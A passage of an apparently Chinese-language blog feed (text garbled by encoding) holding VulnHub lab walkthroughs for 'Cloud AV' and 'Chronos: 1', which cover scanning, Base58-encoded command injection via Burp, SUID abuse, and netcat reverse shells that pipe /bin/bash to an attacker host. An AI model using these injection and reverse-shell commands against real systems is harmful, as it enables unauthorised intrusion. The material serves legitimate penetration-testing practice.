alt="image-20211009165823593"></p><p>åœ¨æ§åˆ¶ç›®æ ‡æœºç«¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav &quot;a | nc 10.0.2.4 7777 | /bin/bash | nc 10.0.2.4 8888&quot;</span><br></pre></td></tr></table></figure><p><strong>åŒå¼•å·ä½œç”¨ï¼šè®©.&#x2F;upadte_cloudavç¨‹åºåœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œè®¤ä¸ºåŒå¼•å·å†…çš„éƒ½æ˜¯å‚æ•°ï¼Œä»è€Œç»§æ‰¿è¿™ä¸ªç¨‹åºå®ƒçš„suidä½çš„æƒé™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week2//image-20211009165854532.png" alt="image-20211009165854532"></p><p>æˆåŠŸæ‹¿åˆ°ç›®æ ‡ç³»ç»Ÿrootæƒé™ï¼</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Name:&lt;/strong&gt; BoredHackerBlog: Cloud AV&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Date release:&lt;/strong&gt; 29 Mar 2020&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/author/boredhackerblog,683/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/series/boredhackerblog,295/&quot;&gt;BoredHackerBlog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Downloadï¼š&lt;/strong&gt;&lt;a href=&quot;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&quot;&gt;https://download.vulnhub.com/boredhackerblog/easy_cloudantivirus.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.&lt;/p&gt;
&lt;p&gt;Currently, itâ€™s in beta mode. Youâ€™ve been asked to test the setup and find vulnerabilities and escalate privs.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Difficulty:&lt;/strong&gt; Easy&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tasks involved:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;port scanning&lt;/li&gt;
&lt;li&gt;webapp attacks&lt;/li&gt;
&lt;li&gt;sql injection&lt;/li&gt;
&lt;li&gt;command injection&lt;/li&gt;
&lt;li&gt;brute forcing&lt;/li&gt;
&lt;li&gt;code analysis&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Virtual Machine:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Format: Virtual Machine (Virtualbox OVA)&lt;/li&gt;
&lt;li&gt;Operating System: Linux&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Networking:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DHCP Service: Enabled&lt;/li&gt;
&lt;li&gt;IP Address Automatically assign&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-3-Chronos:1</title>
    <link href="http://example.com/2022/04/12/week3/"/>
    <id>http://example.com/2022/04/12/week3/</id>
    <published>2022-04-12T07:08:53.099Z</published>
    <updated>2022-04-12T07:10:36.151Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Name</strong>: Chronos: 1</p><p><strong>Date release</strong>: 9 Aug 2021</p><p><strong>Author</strong>: <a href="https://www.vulnhub.com/author/al1enum,745/">AL1ENUM</a></p><p><strong>Series</strong>: <a href="https://www.vulnhub.com/series/chronos,495/">Chronos</a></p><p><strong>Download</strong>:<a href="https://download.vulnhub.com/chronos/Chronos.ova">https://download.vulnhub.com/chronos/Chronos.ova</a></p><p><strong>Description</strong></p><p><strong>Difficulty</strong> : medium</p><p>This works better with VirtualBox rather than VMware.</p></blockquote><span id="more"></span><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1-ä¸»æœºå‘ç°"><a href="#1-ä¸»æœºå‘ç°" class="headerlink" title="1.ä¸»æœºå‘ç°"></a>1.ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -r 10.0.2.0/24</span><br><span class="line">#netdiscoverå·¥å…·çš„ä½¿ç”¨ä¸­ï¼Œå‘ç°åœ¨ç½‘æ®µçš„çœŸå®æ©ç -8ä¼šæ‰«ææ›´å¿«</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144507677.png" alt="image-20211103144507677"></p><p><img src="/Week3.assets/image-20211103144432159.png" alt="image-20211103144432159"></p><p>å‘ç°å­˜æ´»ä¸»æœºï¼Œåˆ¤æ–­é¶æœºIPä¸º10.0.2.6 </p><h3 id="2-ç«¯å£æ‰«æ"><a href="#2-ç«¯å£æ‰«æ" class="headerlink" title="2.ç«¯å£æ‰«æ"></a>2.ç«¯å£æ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.6</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011164411320.png" alt="image-20211011164411320"></p><h3 id="3-æ¢æµ‹ç«¯å£æœåŠ¡"><a href="#3-æ¢æµ‹ç«¯å£æœåŠ¡" class="headerlink" title="3.æ¢æµ‹ç«¯å£æœåŠ¡"></a>3.æ¢æµ‹ç«¯å£æœåŠ¡</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.6</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103144832211.png" alt="image-20211103144832211"></p><p>æ¢æµ‹åˆ°çš„ä¿¡æ¯ï¼š</p><p>â€‹22ç«¯å£ï¼šå¼€æ”¾<strong>SSH</strong>ï¼ˆ7.6p1ï¼‰</p><p>â€‹80ç«¯å£ï¼š<strong>ApacheæœåŠ¡</strong></p><p>â€‹ç›®æ ‡ä¸º<strong>Ubuntu</strong>ç³»ç»Ÿ</p><p>â€‹8000ç«¯å£ï¼š<strong>Node.js</strong>    <strong>Expressæ¡†æ¶</strong></p><h3 id="4-æµè§ˆå™¨è®¿é—®80ç«¯å£"><a href="#4-æµè§ˆå™¨è®¿é—®80ç«¯å£" class="headerlink" title="4.æµè§ˆå™¨è®¿é—®80ç«¯å£"></a>4.æµè§ˆå™¨è®¿é—®80ç«¯å£</h3><p>è®¿é—®80ç«¯å£ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®¿é—®http://10.0.2.6</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165055754.png" alt="image-20211011165055754"></p><p>ä¿¡æ¯:Chronos(é¶æœºå)-Dateï¼ˆæ—¥æœŸï¼‰&amp;Timeï¼ˆæ—¶é—´ï¼‰</p><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°<strong>JSè„šæœ¬</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165144187.png" alt="image-20211011165144187"></p><p>å¤åˆ¶åˆ°ç¼–è¾‘å™¨å†…ï¼Œå‘ç°â€œæ‚ä¹±æ™¦æ¶©â€</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011165214660.png" alt="image-20211011165214660"></p><p>ä½¿ç”¨æ•°æ®åˆ†æå·¥å…·CyberChefè°ƒç”¨â€œJavaScript Beautifyâ€æ¨¡å—â€œç¾åŒ–â€</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170318994.png" alt="image-20211011170318994"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011170456326.png" alt="image-20211011170456326"></p><p>çºµè§‚ç¾åŒ–åçš„ä»£ç ï¼Œå‘ç°å‡½æ•°åç§°ä»æ˜¯ä¸ºç¼–ç å¤„ç†çš„ï¼Œä½†å‘ç°å¯ç–‘ä¿¡æ¯ï¼ˆURLï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure><p>åˆ†æï¼šchronosï¼ˆé¶æœºåï¼‰</p><p>â€‹localï¼ˆæœ¬åœ°&#x2F;æœ¬æœºï¼‰</p><p>â€‹8000ï¼ˆç»“åˆä¹‹å‰æ¢æµ‹åˆ°çš„ä¿¡æ¯8000ç«¯å£ä¹Ÿæ˜¯ç›®æ ‡å¼€æ”¾çš„ç«¯å£ï¼‰</p><p>â€‹data?format&#x3D;4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyLï¼ˆdataå˜é‡<strong>é€šè¿‡formatèµ‹å€¼å®šä½æŸé¡µé¢</strong>ï¼‰</p><p>çŒœæµ‹ï¼šç›®æ ‡é¶æœº80ç«¯å£é¡µé¢åµŒå…¥çš„è„šæœ¬ä¸­åŒ…å«äº†è¯¥URL</p><p>â€‹æ€€ç–‘æ˜¯å¦<strong>åœ¨è¯¥é¡µé¢åŠ è½½çš„è¿‡ç¨‹ä¸­</strong>ï¼šä¼šå»è®¿é—®è¯¥URLâ€“&gt;å¹¶ä»ä¸­è¯»å–ç›¸åº”é¡µé¢èµ„æºâ€“&gt;æ”¾ç½®åˆ°å½“å‰é¡µé¢ä¸­â€“&gt;æ˜¾ç¤ºç›¸åº”ä¿¡æ¯</p><h3 id="5-é¡µé¢ç»‘å®šhosts"><a href="#5-é¡µé¢ç»‘å®šhosts" class="headerlink" title="5.é¡µé¢ç»‘å®šhosts"></a>5.é¡µé¢ç»‘å®šhosts</h3><p>æ€è·¯ï¼šå°è¯•åœ¨æœ¬åœ°å°†10.0.2.6å’Œchronos.loacl<strong>ç»‘å®š</strong>â€“&gt;é‚£ä¹ˆé‡æ–°è®¿é—®ç›®æ ‡80ç«¯å£ï¼ˆ<a href="http://10.0.2.6)æ—¶--&gt;jsè„šæœ¬å°±èƒ½**é¡ºåˆ©è®¿é—®**è„šæœ¬ä¸­çš„url--&gt;å¹¶ä»ä¸­**è¯»å–**ç›¸åº”**é¡µé¢èµ„æº**--&gt;æ”¾ç½®åˆ°å½“å‰é¡µé¢ä¸­--&gt;æ˜¾ç¤ºç›¸åº”çš„**ä¿¡æ¯**--&gt;é¡µé¢åº”è¯¥ä¼šæœ‰**å˜åŒ–/">http://10.0.2.6ï¼‰æ—¶--&gt;JSè„šæœ¬å°±èƒ½**é¡ºåˆ©è®¿é—®**è„šæœ¬ä¸­çš„URL--&gt;å¹¶ä»ä¸­**è¯»å–**ç›¸åº”**é¡µé¢èµ„æº**--&gt;æ”¾ç½®åˆ°å½“å‰é¡µé¢ä¸­--&gt;æ˜¾ç¤ºç›¸åº”çš„**ä¿¡æ¯**--&gt;é¡µé¢åº”è¯¥ä¼šæœ‰**å˜åŒ–</a>**</p><p>æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts     </span><br><span class="line">#ç¼–è¾‘hosts æ‰‹åŠ¨å¢åŠ  IP&amp;åŸŸå ç»‘å®š10.0.2.6å’Œchronos.local</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171039018.png" alt="image-20211011171039018"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ping chronos.local</span><br><span class="line">#éªŒè¯ç»‘å®šæ˜¯å¦æˆåŠŸï¼Œç»“æœæ˜¾ç¤ºåŸŸåè¢«æ­£ç¡®è§£æåˆ°ç›®æ ‡é¶æœºIP</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171625340.png" alt="image-20211011171625340"></p><p>ç»“æœæ˜¾ç¤ºï¼ŒæˆåŠŸè§£æ</p><p>åˆ·æ–°&#x2F;é‡æ–°è®¿é—®ç›®æ ‡80ç«¯å£ï¼ˆ<a href="http://10.0.2.6)/">http://10.0.2.6ï¼‰</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011171725044.png" alt="image-20211011171725044"></p><p>é¡µé¢ä¸Š<strong>æ‰“å°äº†æ—¶é—´</strong>ï¼Œè¿™æ ·å‘ç”Ÿçš„<strong>å˜åŒ–</strong>â€“&gt;æ„å‘³ç€JSè„šæœ¬å¯ä»¥<strong>æ­£å¸¸è®¿é—®</strong>åˆ°URLä¸Šçš„èµ„æºäº†â€“&gt;è‡³æ­¤å»ºç«‹äº†æ­£å¸¸çš„è¿æ¥</p><hr><h2 id="äºŒã€æ¼æ´å‘ç°"><a href="#äºŒã€æ¼æ´å‘ç°" class="headerlink" title="äºŒã€æ¼æ´å‘ç°"></a>äºŒã€æ¼æ´å‘ç°</h2><h3 id="1-æˆªæ–­æŠ“åŒ…åˆ†æ"><a href="#1-æˆªæ–­æŠ“åŒ…åˆ†æ" class="headerlink" title="1.æˆªæ–­æŠ“åŒ…åˆ†æ"></a>1.æˆªæ–­æŠ“åŒ…åˆ†æ</h3><p>æ‰“å¼€Burpsuiteï¼Œé…ç½®ä»£ç†ï¼Œåˆ©ç”¨æˆªæ–­åŠŸèƒ½ï¼Œåˆ†æè®¿é—®é¡µé¢è¿‡ç¨‹ä¸­å‘ç”Ÿçš„<strong>é€šä¿¡è¿‡ç¨‹</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172836302.png" alt="image-20211011172836302"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172903372.png" alt="image-20211011172903372"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011172917467.png" alt="image-20211011172917467"></p><p>é€šè¿‡åˆ†æå‘ç°<strong>ç›®æ ‡å“åº”è¿”å›äº†å½“å‰æ—¶é—´ä¿¡æ¯</strong>ï¼Œä¹Ÿå°±æ˜¯åœ¨é¡µé¢ä¸Šçš„æ˜¾ç¤ºçš„æ—¶é—´ä¿¡æ¯</p><p>å°†è¯·æ±‚Requestå‘é€åˆ°Repeaterå†…ï¼Œä¸è¿›è¡Œä¿®æ”¹</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211011173018704.png" alt="image-20211011173018704"></p><p>ä¸ä¿®æ”¹æ—¶Sendé‡æ”¾ï¼Œæ­£å¸¸è®¿é—®200OK</p><p>ä¿®æ”¹åSendæäº¤è¯·æ±‚ï¼Œèƒ½æ¥æ”¶åˆ°æœåŠ¡å™¨ç«¯çš„å“åº”ä¿¡æ¯ï¼ˆæ—¶é—´ï¼‰</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152254081.png" alt="image-20211103152254081"></p><p>æ•…å¯ä»¥å¾—åˆ°ä¸€ç‚¹ï¼Œ<strong>formatå‚æ•°åçš„å­—ç¬¦</strong>4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyLï¼Œ<strong>å¯¹äºè¿”å›æ—¶é—´æ˜¯å¾ˆå…³é”®çš„</strong></p><h3 id="2-å‘½ä»¤æ³¨å…¥æ¼æ´"><a href="#2-å‘½ä»¤æ³¨å…¥æ¼æ´" class="headerlink" title="2.å‘½ä»¤æ³¨å…¥æ¼æ´"></a>2.å‘½ä»¤æ³¨å…¥æ¼æ´</h3><p>ä½¿ç”¨CyberChefçš„Magicæ¨¡å—å¯¹è¯¥å­—ç¬¦è¿›è¡Œè§£å¯†</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103151711496.png" alt="image-20211103151711496"></p><p>å¾—åˆ°çš„æ˜æ–‡ä¸ºï¼šï¼ˆBase58ç¼–ç â€¦ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°æ˜æ–‡è¿™æ ·çš„æ ¼å¼ï¼Œæƒ³åˆ°äº†Linuxçš„dateå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date</span><br></pre></td></tr></table></figure><p>dateåæ·»åŠ æ˜æ–‡å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103152932781.png" alt="image-20211103152932781"></p><p><strong>çŒœæµ‹å½“è®¿é—®Webç¨‹åºURLæ—¶ï¼ŒæœåŠ¡ç«¯ä½¿ç”¨çš„æ˜¯è¿™æ¡æ“ä½œç³»ç»ŸæŒ‡ä»¤ï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥ç”¨ç¬¦å·è¿æ¥æ‰§è¡Œå‘½ä»¤æ³¨å…¥å‘¢ï¼Ÿ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; || ls  #ä¸å¯è¡Œ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27; &amp;&amp; ls #å¯è¡Œ</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153232194.png" alt="image-20211103153232194"></p><p>ç»“åˆä¹‹å‰çš„URLï¼ŒæœåŠ¡ç«¯èƒ½æ‰§è¡Œçš„å†…å®¹å¿…é¡»æ˜¯Base58ç¼–ç ä¹‹åçš„æ ¼å¼</p><p>æ•…ä½¿ç”¨CyberChefå°†&amp;&amp;lsè½¬ä¸ºBase58ç¼–ç å½¢å¼</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153344923.png" alt="image-20211103153344923"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¾—åˆ°ï¼š&amp;&amp;ls   --Base58ç¼–ç --&gt;   yZSGA</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeaterå†…å°†formatå‚æ•°å€¼æ›¿æ¢ä¸ºyZSGA--&gt;Sendé‡æ”¾</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153429917.png" alt="image-20211103153429917"></p><p>æˆåŠŸæ¥å—åˆ°æœåŠ¡ç«¯å“åº”â€“&gt;è¿”å›å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ä¿¡æ¯â€“&gt;<strong>ç¡®è®¤å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´</strong></p><hr><h2 id="ä¸‰ã€æ¼æ´åˆ©ç”¨"><a href="#ä¸‰ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="ä¸‰ã€æ¼æ´åˆ©ç”¨"></a>ä¸‰ã€æ¼æ´åˆ©ç”¨</h2><h3 id="1-åˆ©ç”¨æ€è·¯"><a href="#1-åˆ©ç”¨æ€è·¯" class="headerlink" title="1.åˆ©ç”¨æ€è·¯"></a>1.åˆ©ç”¨æ€è·¯</h3><p>å¦‚ä½•åˆ©ç”¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Ÿâ€“&gt;<strong>å°è¯•æŸ¥çœ‹ç”¨æˆ·å¯æ‰§è¡Œæ–‡ä»¶ç›®å½•ï¼ˆ&#x2F;binï¼‰</strong>â€“&gt;çœ‹æ˜¯å¦æœ‰å¯åˆ©ç”¨ç‚¹</p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;ls /bin --To Base58--&gt;VAZYW9RHPu6Dï¼ˆä¸‹é¢ä¸å†ä¸ºè½¬ç è´´é™„å›¾ç‰‡**-_-**ï¼‰</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeaterå†…å°†formatå‚æ•°å€¼æ›¿æ¢ä¸ºVAZYW9RHPu6D--&gt;Sendé‡æ”¾</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153619965.png" alt="image-20211103153619965"></p><p>æ•´ç†ç›®å‰å‘ç°çš„<strong>å¯åˆ©ç”¨ä¿¡æ¯</strong>ï¼š</p><p>1.å‘ç°å­˜åœ¨bashï¼Œä¹‹åè‹¥èƒ½è·å–shellï¼Œåˆ™å¯ä»¥æ‰§è¡Œbashellåå¼¹</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085536530.png" alt="image-20211104085536530"></p><p>2.å‘ç°å­˜åœ¨ncï¼Œä½†ä¸ç¡®å®šncç‰ˆæœ¬æ˜¯å¦æœ‰-eå‚æ•°æ–¹ä¾¿æˆ‘ä»¬å»ºç«‹åå¼¹shell ï¼ˆncçš„-eå‚æ•°å…·æœ‰ç¨‹åºé‡å®šå‘â€“è¿æ¥æ‰§è¡Œçš„ä½œç”¨ï¼‰</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153858760.png" alt="image-20211103153858760"></p><h3 id="2-ä½¿ç”¨ncå»ºç«‹è¿æ¥"><a href="#2-ä½¿ç”¨ncå»ºç«‹è¿æ¥" class="headerlink" title="2.ä½¿ç”¨ncå»ºç«‹è¿æ¥"></a>2.ä½¿ç”¨ncå»ºç«‹è¿æ¥</h3><h4 id="éªŒè¯ncæ˜¯å¦å¯æ‰§è¡Œ"><a href="#éªŒè¯ncæ˜¯å¦å¯æ‰§è¡Œ" class="headerlink" title="éªŒè¯ncæ˜¯å¦å¯æ‰§è¡Œ"></a>éªŒè¯ncæ˜¯å¦å¯æ‰§è¡Œ</h4><p>è¿›è¡Œæµ‹è¯•ï¼Œç¡®è®¤ncå‘½ä»¤èƒ½å¦æ­£å¸¸æ‰§è¡Œï¼Ÿèƒ½å¦ä¸kaliå»ºç«‹åå¼¹è¿æ¥ï¼Ÿ</p><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444    #ncä¾¦å¬4444ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211103153939292.png" alt="image-20211103153939292"></p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 --To Base58--&gt;2an39LDoLgxbVq6NMgJeN3RL7</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeaterå†…å°†formatå‚æ•°å€¼æ›¿æ¢ä¸º2an39LDoLgxbVq6NMgJeN3RL7--&gt;Sendé‡æ”¾</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085113440.png" alt="image-20211104085113440"></p><p>æ˜¾ç¤ºæŠ¥é”™ï¼Œä½†åœ¨kaliç«¯ç›‘å¬ç«¯å‘ç°<strong>è¿æ¥å¯ä»¥è¢«æ­£å¸¸å»ºç«‹</strong></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085132470.png" alt="image-20211104085132470"></p><h4 id="éªŒè¯ncæ˜¯å¦åŒ…å«-eå‚æ•°"><a href="#éªŒè¯ncæ˜¯å¦åŒ…å«-eå‚æ•°" class="headerlink" title="éªŒè¯ncæ˜¯å¦åŒ…å«-eå‚æ•°"></a>éªŒè¯ncæ˜¯å¦åŒ…å«-eå‚æ•°</h4><h5 id="1-è‹¥æœ‰åˆ™ä½¿ç”¨-eå‚æ•°åŠ è½½åå¼¹shell"><a href="#1-è‹¥æœ‰åˆ™ä½¿ç”¨-eå‚æ•°åŠ è½½åå¼¹shell" class="headerlink" title="1.è‹¥æœ‰åˆ™ä½¿ç”¨-eå‚æ•°åŠ è½½åå¼¹shell"></a>1.è‹¥æœ‰åˆ™ä½¿ç”¨-eå‚æ•°åŠ è½½åå¼¹shell</h5><p>kaliï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #ncä¾¦å¬4444ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104085819231.png" alt="image-20211104085819231"></p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 -e /bin/bash --To Base58--&gt;ajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH</span><br></pre></td></tr></table></figure><p>BurpSuite:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--Repeaterå†…å°†formatå‚æ•°å€¼æ›¿æ¢ä¸ºajvuL5RnJqominfmDbYteLFr6rCZdb3VR633BCa2fH--&gt;Sendé‡æ”¾</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104090046890.png" alt="image-20211104090046890"></p><p>ä»ç„¶æŠ¥é”™ï¼Œè¯´æ˜ä¸åŒ…å«-eå‚æ•°ï¼Œä¸”ncå»ºç«‹è¿æ¥å¤±è´¥ï¼Œåˆ™<strong>ç¡®å®šç›®æ ‡ç³»ç»Ÿä¸Šncç‰ˆæœ¬ä¸åŒ…å«-eå‚æ•°</strong></p><h5 id="2-è‹¥æ— åˆ™å¯ä»¥ä½¿ç”¨ncä¸²è”çš„æ–¹æ³•é€šè¿‡ç®¡é“æ–¹å¼åœ¨ä¸¤ä¸ªä¾¦å¬æ¥å£ä¸Šè·å¾—åå¼¹shell"><a href="#2-è‹¥æ— åˆ™å¯ä»¥ä½¿ç”¨ncä¸²è”çš„æ–¹æ³•é€šè¿‡ç®¡é“æ–¹å¼åœ¨ä¸¤ä¸ªä¾¦å¬æ¥å£ä¸Šè·å¾—åå¼¹shell" class="headerlink" title="2.è‹¥æ— åˆ™å¯ä»¥ä½¿ç”¨ncä¸²è”çš„æ–¹æ³•é€šè¿‡ç®¡é“æ–¹å¼åœ¨ä¸¤ä¸ªä¾¦å¬æ¥å£ä¸Šè·å¾—åå¼¹shell"></a>2.è‹¥æ— åˆ™å¯ä»¥ä½¿ç”¨<strong>ncä¸²è”</strong>çš„æ–¹æ³•é€šè¿‡ç®¡é“æ–¹å¼åœ¨ä¸¤ä¸ªä¾¦å¬æ¥å£ä¸Šè·å¾—åå¼¹shell</h5><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444  #ncä¾¦å¬4444ç«¯å£</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 5555  #ncä¾¦å¬5555ç«¯å£</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104092959229.png" alt="image-20211104092959229"></p><p>CyberChef:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;nc 10.0.2.4 4444 | /bin/bash | nc 10.0.2.4 5555</span><br></pre></td></tr></table></figure><p>â€“To Base58â€“&gt;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 